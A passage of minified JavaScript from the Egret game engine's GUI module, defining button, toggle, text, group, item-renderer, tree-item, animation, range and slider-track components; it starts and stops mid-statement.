t.TouchEvent.TOUCH_END:e.target==this&&(this.hovered=!0,this.mouseCaptured&&(this.buttonReleased(),this.mouseCaptured=!1));break;case t.TouchEvent.TOUCH_TAP:this.enabled?this.clickHandler(e):e.stopImmediatePropagation()}},n.prototype.buttonReleased=function(){},n.prototype.clickHandler=function(t){},n.prototype.stage_mouseUpHandler=function(t){t.target!=this&&(this.mouseCaptured=!1)},n.prototype.autoRepeat_timerDelayHandler=function(e){this.autoRepeatTimer.reset(),this.autoRepeatTimer.removeEventListener(t.TimerEvent.TIMER,this.autoRepeat_timerDelayHandler,this),this.autoRepeatTimer.delay=this._repeatInterval,this.autoRepeatTimer.addEventListener(t.TimerEvent.TIMER,this.autoRepeat_timerHandler,this),this.autoRepeatTimer.start()},n.prototype.autoRepeat_timerHandler=function(t){e.UIEvent.dispatchUIEvent(this,e.UIEvent.BUTTON_DOWN)},n.prototype.getCurrentSkinState=function(){return this.enabled?this.isDown()||this._keepDown?"down":t.InteractionMode.mode==t.InteractionMode.MOUSE&&(this.hovered||this.mouseCaptured)?"over":"up":i.prototype.getCurrentSkinState.call(this)},n.prototype.partAdded=function(t,e){i.prototype.partAdded.call(this,t,e),e==this.labelDisplay&&(this.labelDisplay.text=this._label)},n}(e.SkinnableComponent);e.ButtonBase=i,i.prototype.__class__="egret.gui.ButtonBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._autoSelected=!0}return __extends(n,i),Object.defineProperty(n.prototype,"selected",{get:function(){return this._selected},set:function(t){this._setSelected(t)},enumerable:!0,configurable:!0}),n.prototype._setSelected=function(t){t!=this._selected&&(this._selected=t,e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT),this.invalidateSkinState())},n.prototype.getCurrentSkinState=function(){return this.selected?i.prototype.getCurrentSkinState.call(this)+"AndSelected":i.prototype.getCurrentSkinState.call(this)},n.prototype.buttonReleased=function(){i.prototype.buttonReleased.call(this),this._autoSelected&&this.enabled&&(this.selected=!this.selected,this.dispatchEventWith(t.Event.CHANGE))},n}(e.ButtonBase);e.ToggleButtonBase=i,i.prototype.__class__="egret.gui.ToggleButtonBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this._fontFamily="SimSun",this._size=30,this._textAlign=t.HorizontalAlign.LEFT,this._verticalAlign=t.VerticalAlign.TOP,this._lineSpacing=0,this._textColor=16777215,this._text=""}return __extends(i,e),Object.defineProperty(i.prototype,"fontFamily",{get:function(){return this._fontFamily},set:function(t){this._fontFamily!=t&&(this._fontFamily=t,this.fontFamilyChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"size",{get:function(){return this._size},set:function(t){this._size!=t&&(this._size=t,this.sizeChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"bold",{get:function(){return this._bold},set:function(t){this._bold!=t&&(this._bold=t,this.boldChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"italic",{get:function(){return this._italic},set:function(t){this._italic!=t&&(this._italic=t,this.italicChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"textAlign",{get:function(){return this._textAlign},set:function(t){this._textAlign!=t&&(this._textAlign=t,this.textAlignChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"verticalAlign",{get:function(){return this._verticalAlign},set:function(t){this._verticalAlign!=t&&(this._verticalAlign=t,this.verticalAlignChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lineSpacing",{get:function(){return this._lineSpacing},set:function(t){this._lineSpacing!=t&&(this._lineSpacing=t,this.lineSpacingChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"textColor",{get:function(){return this._textColor},set:function(t){this._textColor!=t&&(this._textColor=t,this.textColorChanged=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"text",{get:function(){return this._text},set:function(t){t!=this._text&&(this._text=t,this._textChanged=!0,this.invalidateProperties(),this.invalidateSize(),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),i.prototype.createChildren=function(){e.prototype.createChildren.call(this),this._textField||this.checkTextField()},i.prototype.commitProperties=function(){e.prototype.commitProperties.call(this),this._textField||this.checkTextField(),this.fontFamilyChanged&&(this._textField.fontFamily=this._fontFamily,this.fontFamilyChanged=!1),this.sizeChanged&&(this._textField.size=this._size,this.sizeChanged=!1),this.boldChanged&&(this._textField.bold=this._bold,this.boldChanged=!1),this.italic&&(this._textField.italic=this._italic,this.italicChanged=!1),this.textAlignChanged&&(this._textField.textAlign=this._textAlign,this.textAlignChanged=!1),this.verticalAlignChanged&&(this._textField.verticalAlign=this._verticalAlign,this.verticalAlignChanged=!1),this.lineSpacingChanged&&(this._textField.lineSpacing=this._lineSpacing,this.lineSpacingChanged=!1),this.textColorChanged&&(this._textField.textColor=this._textColor,this.textColorChanged=!1),this._textChanged&&(this._textField.text=this._text,this._textChanged=!1)},i.prototype.checkTextField=function(){this._textField||(this.createTextField(),this._textField.text=this._text,this._textChanged=!0,this.invalidateProperties())},i.prototype.createTextField=function(){this._textField=new t.TextField,this._textField.fontFamily=this._fontFamily,this._textField.size=this._size,this._textField.textAlign=this._textAlign,this._textField.verticalAlign=this._verticalAlign,this._textField.lineSpacing=this._lineSpacing,this._textField.textColor=this._textColor,this._addToDisplayList(this._textField)},i.prototype.measure=function(){e.prototype.measure.call(this),this.measuredWidth=i.DEFAULT_MEASURED_WIDTH,this.measuredHeight=i.DEFAULT_MEASURED_HEIGHT},i.prototype.$updateDisplayList=function(t,i){e.prototype.updateDisplayList.call(this,t,i)},i.prototype.updateDisplayList=function(t,i){e.prototype.updateDisplayList.call(this,t,i),this._textField.width=t,this._textField.height=i},i.DEFAULT_MEASURED_WIDTH=160,i.DEFAULT_MEASURED_HEIGHT=22,i}(e.UIComponent);e.TextBase=i,i.prototype.__class__="egret.gui.TextBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._contentHeight=this._contentWidth=0,this._clipAndEnableScrolling=!1,this._verticalScrollPosition=this._horizontalScrollPosition=0,this.touchEnabled=this._layoutInvalidateSizeFlag=this._layoutInvalidateDisplayListFlag=!1}return __extends(n,i),n.prototype.createChildren=function(){i.prototype.createChildren.call(this),this._layout||(this.layout=new e.BasicLayout)},Object.defineProperty(n.prototype,"contentWidth",{get:function(){return this._contentWidth},enumerable:!0,configurable:!0}),n.prototype.setContentWidth=function(t){if(t!=this._contentWidth){var i=this._contentWidth;this._contentWidth=t,this.hasEventListener("propertyChange")&&e.PropertyChangeEvent.dispatchPropertyChangeEvent(this,e.PropertyChangeEventKind.UPDATE,"contentWidth",i,t,this)}},Object.defineProperty(n.prototype,"contentHeight",{get:function(){return this._contentHeight},enumerable:!0,configurable:!0}),n.prototype.setContentHeight=function(t){if(t!=this._contentHeight){var i=this._contentHeight;this._contentHeight=t,this.hasEventListener("propertyChange")&&e.PropertyChangeEvent.dispatchPropertyChangeEvent(this,e.PropertyChangeEventKind.UPDATE,"contentHeight",i,t,this)}},n.prototype.setContentSize=function(t,e){t==this._contentWidth&&e==this._contentHeight||(this.setContentWidth(t),this.setContentHeight(e))},Object.defineProperty(n.prototype,"layout",{get:function(){return this._layout},set:function(t){this._setLayout(t)},enumerable:!0,configurable:!0}),n.prototype._setLayout=function(t){this._layout!=t&&(this._layout&&(this._layout.target=null),(this._layout=t)&&(this._layout.target=this),this.invalidateSize(),this.invalidateDisplayList(),this.dispatchEventWith("layoutChanged"))},Object.defineProperty(n.prototype,"clipAndEnableScrolling",{get:function(){return this._clipAndEnableScrolling},set:function(e){e!=this._clipAndEnableScrolling&&(this.scrollRect=(this._clipAndEnableScrolling=e)?new t.Rectangle(this._horizontalScrollPosition,this._verticalScrollPosition,this.width,this.height):null)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"horizontalScrollPosition",{get:function(){return this._horizontalScrollPosition},set:function(t){if(t!=this._horizontalScrollPosition){var i=this._horizontalScrollPosition;this._horizontalScrollPosition=t,this.scrollPositionChanged(),e.PropertyChangeEvent.dispatchPropertyChangeEvent(this,e.PropertyChangeEventKind.UPDATE,"horizontalScrollPosition",i,t,this)}},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"verticalScrollPosition",{get:function(){return this._verticalScrollPosition},set:function(t){if(t!=this._verticalScrollPosition){var i=this._verticalScrollPosition;this._verticalScrollPosition=t,this.scrollPositionChanged(),e.PropertyChangeEvent.dispatchPropertyChangeEvent(this,e.PropertyChangeEventKind.UPDATE,"verticalScrollPosition",i,t,this)}},enumerable:!0,configurable:!0}),n.prototype.scrollPositionChanged=function(){this._clipAndEnableScrolling&&(this.updateScrollRect(this.width,this.height),this._invalidateDisplayListExceptLayout(),this._layout&&this._layout.scrollPositionChanged())},n.prototype.updateScrollRect=function(e,i){var n=this._scrollRect;this._clipAndEnableScrolling?n?(n.x=this._horizontalScrollPosition,n.y=this._verticalScrollPosition,n.width=e,n.height=i):this._scrollRect=new t.Rectangle(this._horizontalScrollPosition,this._verticalScrollPosition,e,i):n&&(this._scrollRect=null)},n.prototype.measure=function(){this._layout&&this._layoutInvalidateSizeFlag&&(i.prototype.measure.call(this),this._layout.measure())},n.prototype._invalidateDisplayListExceptLayout=function(){i.prototype.invalidateDisplayList.call(this)},n.prototype.invalidateDisplayList=function(){i.prototype.invalidateDisplayList.call(this),this._layoutInvalidateDisplayListFlag=!0},n.prototype._childXYChanged=function(){this.invalidateSize(),this.invalidateDisplayList()},n.prototype._invalidateSizeExceptLayout=function(){i.prototype.invalidateSize.call(this)},n.prototype.invalidateSize=function(){i.prototype.invalidateSize.call(this),this._layoutInvalidateSizeFlag=!0},n.prototype.updateDisplayList=function(t,e){i.prototype.updateDisplayList.call(this,t,e),this._layoutInvalidateDisplayListFlag&&this._layout&&(this._layoutInvalidateDisplayListFlag=!1,this._layout.updateDisplayList(t,e),this.updateScrollRect(t,e))},Object.defineProperty(n.prototype,"numElements",{get:function(){return-1},enumerable:!0,configurable:!0}),n.prototype.getElementAt=function(t){return null},n.prototype.getElementIndex=function(t){return-1},n.prototype.getElementIndicesInView=function(){var e,i=[];if(this.scrollRect)for(e=0;e<this.numChildren;e++){var n=this.getChildAt(e);if(n){var r=new t.Rectangle;r.x=n.layoutBoundsX,r.y=n.layoutBoundsY,r.width=n.layoutBoundsWidth,r.height=n.layoutBoundsHeight,this.scrollRect.intersects(r)&&i.push(e)}}else for(e=0;e<this.numChildren;e++)i.push(e);return i},n.prototype.setVirtualElementIndicesInView=function(t,e){},n.prototype.getVirtualElementAt=function(t){return this.getElementAt(t)},n}(e.UIComponent);e.GroupBase=i,i.prototype.__class__="egret.gui.GroupBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this._selected=this.dataChangedFlag=!1,this._itemIndex=-1,this.touchChildren=!0}return __extends(e,t),Object.defineProperty(e.prototype,"data",{get:function(){return this._data},set:function(t){this._data=t,this.initialized||this.parent?(this.dataChangedFlag=!1,this.dataChanged()):(this.dataChangedFlag=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),e.prototype.dataChanged=function(){},Object.defineProperty(e.prototype,"selected",{get:function(){return this._selected},set:function(t){this._selected!=t&&(this._selected=t,this.invalidateSkinState())},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"itemIndex",{get:function(){return this._itemIndex},set:function(t){this._itemIndex=t},enumerable:!0,configurable:!0}),e.prototype.commitProperties=function(){t.prototype.commitProperties.call(this),this.dataChangedFlag&&(this.dataChangedFlag=!1,this.dataChanged())},e.prototype.getCurrentSkinState=function(){return this._selected?"down":t.prototype.getCurrentSkinState.call(this)},e}(t.ButtonBase);t.ItemRenderer=e,e.prototype.__class__="egret.gui.ItemRenderer"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._indentation=17,this._depth=0,this._isOpen=this._hasChildren=!1,this.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.onItemMouseDown,this,!1,1e3)}return __extends(n,i),n.prototype.onItemMouseDown=function(t){t.target==this.disclosureButton&&t.stopImmediatePropagation()},Object.defineProperty(n.prototype,"indentation",{get:function(){return this._indentation},set:function(t){this._indentation=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"iconSkinName",{get:function(){return this._iconSkinName},set:function(t){this._iconSkinName!=t&&(this._iconSkinName=t,this.iconDisplay&&(this.iconDisplay.source=this._iconSkinName))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"depth",{get:function(){return this._depth},set:function(t){t!=this._depth&&(this._depth=t,this.contentGroup&&(this.contentGroup.x=this._depth*this._indentation))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"hasChildren",{get:function(){return this._hasChildren},set:function(t){this._hasChildren!=t&&(this._hasChildren=t,this.disclosureButton&&(this.disclosureButton.visible=this._hasChildren))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"opened",{get:function(){return this._isOpen},set:function(t){this._isOpen!=t&&(this._isOpen=t,this.disclosureButton&&(this.disclosureButton.selected=this._isOpen))},enumerable:!0,configurable:!0}),n.prototype.partAdded=function(e,n){i.prototype.partAdded.call(this,e,n),n==this.iconDisplay?this.iconDisplay.source=this._iconSkinName:n==this.disclosureButton?(this.disclosureButton.visible=this._hasChildren,this.disclosureButton.selected=this._isOpen,this.disclosureButton._autoSelected=!1,this.disclosureButton.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.disclosureButton_mouseDownHandler,this)):n==this.contentGroup&&(this.contentGroup.x=this._depth*this._indentation)},n.prototype.partRemoved=function(e,n){i.prototype.partRemoved.call(this,e,n),n==this.iconDisplay?this.iconDisplay.source=null:n==this.disclosureButton&&(this.disclosureButton.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.disclosureButton_mouseDownHandler,this),this.disclosureButton._autoSelected=!0,this.disclosureButton.visible=!0)},n.prototype.disclosureButton_mouseDownHandler=function(t){e.TreeEvent.dispatchTreeEvent(this,e.TreeEvent.ITEM_OPENING,this.itemIndex,this.data,this,!this._isOpen)},n}(e.ItemRenderer);e.TreeItemRenderer=i,i.prototype.__class__="egret.gui.TreeItemRenderer"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(e){var i=function(){function e(e,i){this.easerFunction=t.Ease.sineInOut,this._duration=500,this._startDelay=0,this._repeatCount=1,this._repeatDelay=0,this.motionPaths=[],this._currentValue={},this.pauseTime=0,this._isPaused=!1,this.startTime=0,this._started=!1,this.playedTimes=0,this.updateFunction=e,this.thisObject=i}return Object.defineProperty(e.prototype,"isPlaying",{get:function(){return this._isPlaying},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"duration",{get:function(){return this._duration},set:function(t){this._duration=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"startDelay",{get:function(){return this._startDelay},set:function(t){this._startDelay=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"repeatCount",{get:function(){return this._repeatCount},set:function(t){this._repeatCount=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"repeatDelay",{get:function(){return this._repeatDelay},set:function(t){this._repeatDelay=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"currentValue",{get:function(){return this._currentValue},enumerable:!0,configurable:!0}),e.prototype.play=function(){this.stopAnimation(),this.start()},e.prototype.seek=function(e){e=Math.min(e,this.duration),this.caculateCurrentValue(e/this.duration),this.startTime=t.getTimer()-e-this._startDelay,null!=this.updateFunction&&this.updateFunction.call(this.thisObject,this)},e.prototype.start=function(){this.playedTimes=0,this._started=!0,this._isPlaying=!1,this._currentValue={},this.caculateCurrentValue(0),this.startTime=t.getTimer(),e.currentTime=this.startTime,this.doInterval(),e.addAnimation(this)},e.prototype.end=function(){this._started||(this.caculateCurrentValue(0),null!=this.startFunction&&this.startFunction.call(this.thisObject,this),null!=this.updateFunction&&this.updateFunction.call(this.thisObject,this)),this.caculateCurrentValue(1),null!=this.updateFunction&&this.updateFunction.call(this.thisObject,this),this.stopAnimation(),null!=this.endFunction&&this.endFunction.call(this.thisObject,this)},e.prototype.stop=function(){this.stopAnimation(),null!=this.stopFunction&&this.stopFunction.call(this.thisObject,this)},e.prototype.stopAnimation=function(){this.playedTimes=0,this._isPlaying=!1,this.startTime=0,this._started=!1,e.removeAnimation(this)},Object.defineProperty(e.prototype,"isPaused",{get:function(){return this._isPaused},enumerable:!0,configurable:!0}),e.prototype.pause=function(){this._started&&(this._isPaused=!0,this.pauseTime=t.getTimer(),this._isPlaying=!1,e.removeAnimation(this))},e.prototype.resume=function(){this._started&&this._isPaused&&(this._isPaused=!1,this.startTime+=t.getTimer()-this.pauseTime,this.pauseTime=-1,e.addAnimation(this))},Object.defineProperty(e.prototype,"started",{get:function(){return this._started},enumerable:!0,configurable:!0}),e.prototype.doInterval=function(){var t=e.currentTime-this.startTime-(0<this.playedTimes?this._repeatDelay:this._startDelay);if(0>t)return!1;this._isPlaying||(this._isPlaying=!0,0==this.playedTimes&&null!=this.startFunction&&this.startFunction.call(this.thisObject,this));var i=0==this._duration?1:Math.min(t,this._duration)/this._duration;return this.caculateCurrentValue(i),null!=this.updateFunction&&this.updateFunction.call(this.thisObject,this),(t=t>=this._duration)&&(this.playedTimes++,this._isPlaying=!1,this.startTime=e.currentTime,0==this._repeatCount||this.playedTimes<this._repeatCount?t=!1:(e.removeAnimation(this),this._started=!1,this.playedTimes=0)),t&&null!=this.endFunction&&this.endFunction.call(this.thisObject,this),t},e.prototype.caculateCurrentValue=function(t){this.easerFunction&&(t=this.easerFunction(t));for(var e=this.motionPaths,i=e.length,n=0;n<i;n++){var r=e[n];this.currentValue[r.prop]=r.from+(r.to-r.from)*t}},e.addAnimation=function(i){-1==e.activeAnimations.indexOf(i)&&(e.activeAnimations.push(i),e.registered||(e.registered=!0,t.Ticker.getInstance().register(e.onEnterFrame,null)))},e.removeAnimation=function(i){-1!=(i=e.activeAnimations.indexOf(i))&&(e.activeAnimations.splice(i,1),i<=e.currentIntervalIndex&&e.currentIntervalIndex--),0==e.activeAnimations.length&&e.registered&&(e.registered=!1,t.Ticker.getInstance().unregister(e.onEnterFrame,null))},e.onEnterFrame=function(i,n){for(e.currentTime=t.getTimer(),e.currentIntervalIndex=0;e.currentIntervalIndex<e.activeAnimations.length;)e.activeAnimations[e.currentIntervalIndex].doInterval(),e.currentIntervalIndex++;e.currentIntervalIndex=-1,0==e.activeAnimations.length&&e.registered&&(e.registered=!1,t.Ticker.getInstance().unregister(e.onEnterFrame,null))},e.currentTime=0,e.TIMER_RESOLUTION=1e3/60,e.activeAnimations=[],e.currentIntervalIndex=-1,e}();e.Animation=i,i.prototype.__class__="egret.gui.Animation"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this._maximum=100,this.maxChanged=!1,this._minimum=0,this.minChanged=!1,this._stepSize=1,this.stepSizeChanged=!1,this._changedValue=this._value=0,this.valueChanged=!1,this._snapInterval=1,this._explicitSnapInterval=this.snapIntervalChanged=!1}return __extends(e,t),Object.defineProperty(e.prototype,"maximum",{get:function(){return this._maximum},set:function(t){this._setMaximun(t)},enumerable:!0,configurable:!0}),e.prototype._setMaximun=function(t){t!=this._maximum&&(this._maximum=t,this.maxChanged=!0,this.invalidateProperties())},Object.defineProperty(e.prototype,"minimum",{get:function(){return this._minimum},set:function(t){this._setMinimun(t)},enumerable:!0,configurable:!0}),e.prototype._setMinimun=function(t){t!=this._minimum&&(this._minimum=t,this.minChanged=!0,this.invalidateProperties())},Object.defineProperty(e.prototype,"stepSize",{get:function(){return this._stepSize},set:function(t){t!=this._stepSize&&(this._stepSize=t,this.stepSizeChanged=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"value",{get:function(){return this._getValue()},set:function(t){this._setValue(t)},enumerable:!0,configurable:!0}),e.prototype._setValue=function(t){t!=this.value&&(this._changedValue=t,this.valueChanged=!0,this.invalidateProperties())},e.prototype._getValue=function(){return this.valueChanged?this._changedValue:this._value},Object.defineProperty(e.prototype,"snapInterval",{get:function(){return this._snapInterval},set:function(t){this._explicitSnapInterval=!0,t!=this._snapInterval&&(isNaN(t)?(this._snapInterval=1,this._explicitSnapInterval=!1):this._snapInterval=t,this.stepSizeChanged=this.snapIntervalChanged=!0,this.invalidateProperties())},enumerable:!0,configurable:!0}),e.prototype.commitProperties=function(){if(t.prototype.commitProperties.call(this),this.minimum>this.maximum&&(this.maxChanged?this._maximum=this._minimum:this._minimum=this._maximum),this.valueChanged||this.maxChanged||this.minChanged||this.snapIntervalChanged){var e=this.valueChanged?this._changedValue:this._value;this.snapIntervalChanged=this.minChanged=this.maxChanged=this.valueChanged=!1,this.setValue(this.nearestValidValue(e,this.snapInterval))}this.stepSizeChanged&&(this._explicitSnapInterval?this._stepSize=this.nearestValidSize(this._stepSize):(this._snapInterval=this._stepSize,this.setValue(this.nearestValidValue(this._value,this.snapInterval))),this.stepSizeChanged=!1)},e.prototype.nearestValidSize=function(t){var e=this.snapInterval;return 0==e?t:(t=Math.round(t/e)*e,Math.abs(t)<e?e:t)},e.prototype.nearestValidValue=function(t,e){if(0==e)return Math.max(this.minimum,Math.min(this.maximum,t));var i=this.maximum-this.minimum,n=1;t-=this.minimum,e!=Math.round(e)&&(n=(1+e).toString().split("."),n=Math.pow(10,n[1].length),i*=n,t=Math.round(t*n),e=Math.round(e*n));var r=Math.max(0,Math.floor(t/e)*e);return(t-r>=((i=Math.min(i,Math.floor((t+e)/e)*e))-r)/2?i:r)/n+this.minimum},e.prototype.setValue=function(t){this._value!=t&&(isNaN(t)&&(t=0),!isNaN(this.maximum)&&!isNaN(this.minimum)&&this.maximum>this.minimum?this._value=Math.min(this.maximum,Math.max(this.minimum,t)):this._value=t,this.valueChanged=!1)},e.prototype.changeValueByStep=function(t){void 0===t&&(t=!0),0!=this.stepSize&&this.setValue(this.nearestValidValue(t?this.value+this.stepSize:this.value-this.stepSize,this.snapInterval))},e}(t.SkinnableComponent);t.Range=e,e.prototype.__class__="egret.gui.Range"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._slideDuration=300,this.needUpdateValue=!1,this.addEventListener(t.Event.ADDED_TO_STAGE,this.addedToStageHandler,this),this.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.mouseDownHandler,this)}return __extends(n,i),Object.defineProperty(n.prototype,"slideDuration",{get:function(){return this._slideDuration},set:function(t){this._slideDuration=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"maximum",{get:function(){return this._maximum},set:function(t){t!=this._maximum&&(this._setMaximun(t),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"minimum",{get:function(){return this._minimum},set:function(t){t!=this._minimum&&(this._setMinimun(t),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"value",{get:function(){return this._getValue()},set:function(t){t!=this._getValue()&&(this._setValue(t),this.invalidateDisplayList())},enumerable:!0,configurable:!0}),n.prototype.setValue=function(t){i.prototype.setValue.call(this,t),this.invalidateDisplayList()},n.prototype.pointToValue=function(t,e){return this.minimum},n.prototype.changeValueByStep=function(e){void 0===e&&(e=!0);var n=this.value;i.prototype.changeValueByStep.call(this,e),this.value!=n&&this.dispatchEventWith(t.Event.CHANGE)},n.prototype.partAdded=function(n,r){i.prototype.partAdded.call(this,n,r),r==this.thumb?(this.thumb.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.thumb_mouseDownHandler,this),this.thumb.addEventListener(e.ResizeEvent.RESIZE,this.thumb_resizeHandler,this),this.thumb.addEventListener(e.UIEvent.UPDATE_COMPLETE,this.thumb_updateCompleteHandler,this),this.thumb.stickyHighlighting=!0):r==this.track&&(this.track.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.track_mouseDownHandler,this),this.track.addEventListener(e.ResizeEvent.RESIZE,this.track_resizeHandler,this))},n.prototype.partRemoved=function(n,r){i.prototype.partRemoved.call(this,n,r),r==this.thumb?(this.thumb.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.thumb_mouseDownHandler,this),this.thumb.removeEventListener(e.ResizeEvent.RESIZE,this.thumb_resizeHandler,this),this.thumb.removeEventListener(e.UIEvent.UPDATE_COMPLETE,this.thumb_updateCompleteHandler,this)):r==this.track&&(this.track.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.track_mouseDownHandler,this),this.track.removeEventListener(e.ResizeEvent.RESIZE,this.track_resizeHandler,this))},n.prototype.updateDisplayList=function(t,e){i.prototype.updateDisplayList.call(this,t,e),this.updateSkinDisplayList()},n.prototype.updateSkinDisplayList=function(){},n.prototype.addedToStageHandler=function(t){this.updateSkinDisplayList()},n.prototype.track_resizeHandler=function(t){this.updateSkinDisplayList()},n.prototype.thumb_resizeHandler=function(t){this.updateSkinDisplayList()},n.prototype.thumb_updateCompleteHandler=function(t){this.updateSkinDisplayList(),this.thumb.removeEventListener(e.UIEvent.UPDATE_COMPLETE,this.thumb_updateCompleteHandler,this)},n.prototype.thumb_mouseDownHandler=function(i){e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_MOVE,this.stage_mouseMoveHandler,this),e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this),this.addEventListener(t.Event.ENTER_FRAME,this.onEnterFrame,this),i=this.thumb.globalToLocal(i.stageX,i.stageY,t.Point.identity),this._clickOffsetX=i.x,this._clickOffsetY=i.y,e.TrackBaseEvent.dispatchTrackBaseEvent(this,e.TrackBaseEvent.THUMB_PRESS),e.UIEvent.dispatchUIEvent(this,e.UIEvent.CHANGE_START)},n.prototype.onEnterFrame=function(t){this.needUpdateValue&&this.track&&(this.updateWhenMouseMove(),this.needUpdateValue=!1)},n.prototype.updateWhenMouseMove=function(){if(this.track){var i=this.track.globalToLocal(this._moveStageX,this._moveStageY,t.Point.identity),i=this.pointToValue(i.x-this._clickOffsetX,i.y-this._clickOffsetY);(i=this.nearestValidValue(i,this.snapInterval))!=this.value&&(this.setValue(i),this.validateDisplayList(),e.TrackBaseEvent.dispatchTrackBaseEvent(this,e.TrackBaseEvent.THUMB_DRAG),this.dispatchEventWith(t.Event.CHANGE))}},n.prototype.stage_mouseMoveHandler=function(t){this._moveStageX=t.stageX,this._moveStageY=t.stageY,this.needUpdateValue||(this.needUpdateValue=!0)},n.prototype.stage_mouseUpHandler=function(i){e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_MOVE,this.stage_mouseMoveHandler,this),e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this),this.removeEventListener(t.Event.ENTER_FRAME,this.updateWhenMouseMove,this),this.needUpdateValue&&(this.updateWhenMouseMove(),this.needUpdateValue=!1),e.TrackBaseEvent.dispatchTrackBaseEvent(this,e.TrackBaseEvent.THUMB_RELEASE),e.UIEvent.dispatchUIEvent(this,e.UIEvent.CHANGE_END)},n.prototype.track_mouseDownHandler=function(t){},n.prototype.mouseDownHandler=function(i){e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpSomewhereHandler,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpSomewhereHandler,this),this.mouseDownTarget=i.target},n.prototype.stage_mouseUpSomewhereHandler=function(i){if(e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpSomewhereHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpSomewhereHandler,this),this.mouseDownTarget!=i.target&&i instanceof t.TouchEvent&&this.contains(i.target)){var 